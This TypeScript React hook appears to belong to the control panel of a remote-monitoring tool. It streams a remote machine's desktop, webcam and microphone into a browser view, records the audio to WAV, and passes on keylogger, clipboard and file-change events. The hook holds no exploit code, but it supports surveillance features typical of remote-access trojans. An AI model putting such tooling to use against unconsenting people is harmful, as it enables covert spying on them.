// 会话媒体流 SSE 钩子(真实对接): 单点订阅会话级事件流, 处理三类媒体帧 ——
//   deskstream_data  桌面帧(desktop_full / desktop_diff / desktop_diff_blocks, canvas 直绘)
//   camstream_data   摄像头帧(base64 JPEG → <img>)
//   audio_data       PCM 音频(边收边播 + 缓冲可导出 WAV)
// 其余事件(键盘记录/剪贴板/文件变更等)透传给 onEvent, 由宿主面板自行处理。
// 暂停语义(与老版 MonitorPage 一致): 暂停只停"渲染", 流本身仍在推送。
import { useCallback, useEffect, useRef, useState, type RefObject } from 'react'
import { connectSessionEvents, type CleatEvent } from '@/lib/cleat-api'
import { base64ToBytes, b64ToBitmap, decodePcmToBuffer, encodeWav, downloadBytes } from './stream-utils'

/**
 * 音频队列串行播放。
 * 放模块级: `onended` 里要自递归续播, 组件作用域内的自引用会触发
 * react-hooks 的"引用顺序/重建依赖链"告警, 提取成纯函数最干净。
 */
function drainAudioQueue(ctx: AudioContext, playingRef: RefObject<boolean>, queueRef: RefObject<AudioBuffer[]>): void {
  if (playingRef.current || queueRef.current.length === 0) return
  playingRef.current = true
  const src = ctx.createBufferSource()
  src.buffer = queueRef.current.shift()!
  src.connect(ctx.destination)
  src.onended = () => {
    playingRef.current = false
    drainAudioQueue(ctx, playingRef, queueRef)
  }
  src.start()
}

export interface UseMediaStreamOptions {
  /** 暂停渲染(流不中断) */
  paused?: boolean
  /** 非媒体事件透传(keylog / clipboard_data / file_change 等) */
  onEvent?: (ev: CleatEvent) => void
}

export interface UseMediaStreamResult {
  // ---- 桌面流 ----
  desktopCanvasRef: React.RefObject<HTMLCanvasElement | null>
  /** 是否已收到至少一帧(未收到时画布显示占位提示) */
  desktopHasFrame: boolean
  /** 桌面流状态行(如 1920×1080) */
  desktopInfo: string
  // ---- 摄像头 ----
  /** data:image/jpeg;base64,...(空串=未连接) */
  cameraImg: string
  cameraInfo: string
  // ---- 音频 ----
  audioStatus: string
  /** 已缓冲 PCM 字节数 */
  audioBytes: number
  /** 导出 WAV(返回保存的字节数, 0=无数据) */
  saveWav: () => number
  /** 清空音频缓冲 */
  clearAudio: () => void
}

export function useMediaStream(sessionId: number, opts: UseMediaStreamOptions = {}): UseMediaStreamResult {
  const { paused = false, onEvent } = opts

  // 暂停/回调走 ref: 避免因它们变化重建 SSE 连接(老版踩过的"暂停=断连重连"坑)。
  // ref 写入放 effect(禁止渲染期写 ref); SSE 事件是异步的, 先渲染后同步完全够。
  const pausedRef = useRef(paused)
  const onEventRef = useRef(onEvent)
  useEffect(() => {
    pausedRef.current = paused
  }, [paused])
  useEffect(() => {
    onEventRef.current = onEvent
  }, [onEvent])

  // ---- 桌面画布 ----
  const desktopCanvasRef = useRef<HTMLCanvasElement | null>(null)
  const ctx2dRef = useRef<CanvasRenderingContext2D | null>(null)
  const lastWRef = useRef(0)
  const lastHRef = useRef(0)
  const [desktopHasFrame, setDesktopHasFrame] = useState(false)
  const [desktopInfo, setDesktopInfo] = useState('未连接')

  // ---- 摄像头 ----
  const [cameraImg, setCameraImg] = useState('')
  const [cameraInfo, setCameraInfo] = useState('未连接')

  // ---- 音频 ----
  const [audioStatus, setAudioStatus] = useState('未录音')
  const [audioBytes, setAudioBytes] = useState(0)
  const audioCtxRef = useRef<AudioContext | null>(null)
  const audioChunksRef = useRef<Uint8Array[]>([])
  const audioQueueRef = useRef<AudioBuffer[]>([])
  const audioPlayingRef = useRef(false)
  const audioMetaRef = useRef({ sampleRate: 16000, channels: 1, bits: 16 })

  // ---- 桌面帧绘制 ----
  const ensureCanvas = useCallback((w: number, h: number) => {
    const canvas = desktopCanvasRef.current
    if (!canvas) return
    if (!ctx2dRef.current) ctx2dRef.current = canvas.getContext('2d')
    if (w > 0 && h > 0 && (lastWRef.current !== w || lastHRef.current !== h)) {
      canvas.width = w
      canvas.height = h
      lastWRef.current = w
      lastHRef.current = h
    }
  }, [])

  const drawJpegAt = useCallback(async (b64: string, x: number, y: number, w: number, h: number) => {
    const ctx2d = ctx2dRef.current
    if (!ctx2d) return
    try {
      const bmp = await b64ToBitmap(b64)
      ctx2d.drawImage(bmp, x, y, w || bmp.width, h || bmp.height)
      bmp.close()
    } catch {
      // 单帧解码失败跳过(不中断整条流)
    }
  }, [])

  const handleDesktopFrame = useCallback(
    async (d: Record<string, unknown>) => {
      const type = String(d.type || 'desktop_full')
      const img = d.image
      if (typeof img !== 'string' || !img) return
      if (type === 'desktop_full') {
        const w = Number(d.width) || 0
        const h = Number(d.height) || 0
        ensureCanvas(w, h)
        await drawJpegAt(img, 0, 0, w, h)
        setDesktopInfo(w > 0 && h > 0 ? `${w}×${h}` : '已连接')
        setDesktopHasFrame(true)
      } else if (type === 'desktop_diff') {
        await drawJpegAt(img, Number(d.x) || 0, Number(d.y) || 0, Number(d.w) || 0, Number(d.h) || 0)
        setDesktopHasFrame(true)
      } else if (type === 'desktop_diff_blocks') {
        const blocks = d.blocks
        const ctx2d = ctx2dRef.current
        if (!ctx2d || !Array.isArray(blocks)) return
        // 单帧二进制 = 多个 JPEG 块首尾相接, 按 blocks[i].size 顺序切分
        const bytes = base64ToBytes(img)
        let offset = 0
        for (const b of blocks as Array<Record<string, unknown>>) {
          const size = Number(b.size) || 0
          if (size <= 0) continue
          const slice = bytes.slice(offset, offset + size)
          offset += size
          try {
            const bmp = await createImageBitmap(new Blob([slice as BlobPart], { type: 'image/jpeg' }))
            ctx2d.drawImage(bmp, Number(b.x) || 0, Number(b.y) || 0, Number(b.w) || bmp.width, Number(b.h) || bmp.height)
            bmp.close()
          } catch {
            // 跳过损坏块
          }
        }
        setDesktopHasFrame(true)
      }
    },
    [ensureCanvas, drawJpegAt]
  )

  // ---- 音频播放(队列串行 + 边收边播) ----
  const ensureAudioCtx = useCallback((): AudioContext | null => {
    if (!audioCtxRef.current) {
      const AC = window.AudioContext || (window as unknown as { webkitAudioContext?: typeof AudioContext }).webkitAudioContext
      if (!AC) return null
      audioCtxRef.current = new AC()
    }
    void audioCtxRef.current.resume().catch(() => undefined)
    return audioCtxRef.current
  }, [])

  const playNext = useCallback(() => {
    const ctx = audioCtxRef.current
    if (ctx) drainAudioQueue(ctx, audioPlayingRef, audioQueueRef)
  }, [])

  const handleAudioFrame = useCallback(
    (d: Record<string, unknown>) => {
      if (typeof d.audio !== 'string') return
      const meta = audioMetaRef.current
      meta.sampleRate = Number(d.sample_rate) || meta.sampleRate
      meta.channels = Number(d.channels) || meta.channels
      meta.bits = Number(d.bits_per_sample) || meta.bits
      const bytes = base64ToBytes(d.audio)
      audioChunksRef.current.push(bytes)
      const ctx = ensureAudioCtx()
      if (ctx) {
        const buf = decodePcmToBuffer(ctx, bytes, meta.sampleRate, meta.channels, meta.bits)
        if (buf) {
          audioQueueRef.current.push(buf)
          playNext()
        }
      }
      const total = audioChunksRef.current.reduce((n, p) => n + p.length, 0)
      setAudioBytes(total)
      setAudioStatus(`录音中… ${(total / 1024).toFixed(0)} KB`)
    },
    [ensureAudioCtx, playNext]
  )

  // ---- SSE 生命周期: 每会话单连接 ----
  useEffect(() => {
    if (!sessionId) return
    const disconnect = connectSessionEvents(sessionId, (ev) => {
      if (pausedRef.current) return
      const d = (ev.data || {}) as Record<string, unknown>
      switch (ev.type) {
        case 'deskstream_data':
          void handleDesktopFrame(d)
          break
        case 'camstream_data': {
          const img = d.image
          if (typeof img === 'string' && img) {
            setCameraImg(`data:image/jpeg;base64,${img}`)
            setCameraInfo(`${d.width || '?'}×${d.height || '?'}`)
          }
          break
        }
        case 'audio_data':
          handleAudioFrame(d)
          break
        default:
          onEventRef.current?.(ev)
          break
      }
    })
    return () => {
      disconnect()
    }
  }, [sessionId, handleDesktopFrame, handleAudioFrame])

  // 卸载时释放 AudioContext
  useEffect(() => {
    return () => {
      void audioCtxRef.current?.close().catch(() => undefined)
      audioCtxRef.current = null
    }
  }, [])

  const saveWav = useCallback((): number => {
    const chunks = audioChunksRef.current
    const total = chunks.reduce((n, p) => n + p.length, 0)
    if (total === 0) return 0
    const merged = new Uint8Array(total)
    let offset = 0
    for (const p of chunks) {
      merged.set(p, offset)
      offset += p.length
    }
    const meta = audioMetaRef.current
    const wav = encodeWav(merged, meta.sampleRate, meta.channels, meta.bits)
    downloadBytes(wav, `recording-${sessionId}-${Date.now()}.wav`, 'audio/wav')
    return total
  }, [sessionId])

  const clearAudio = useCallback(() => {
    audioChunksRef.current = []
    audioQueueRef.current = []
    audioPlayingRef.current = false
    setAudioBytes(0)
    setAudioStatus('已清空')
  }, [])

  return {
    desktopCanvasRef,
    desktopHasFrame,
    desktopInfo,
    cameraImg,
    cameraInfo,
    audioStatus,
    audioBytes,
    saveWav,
    clearAudio,
  }
}
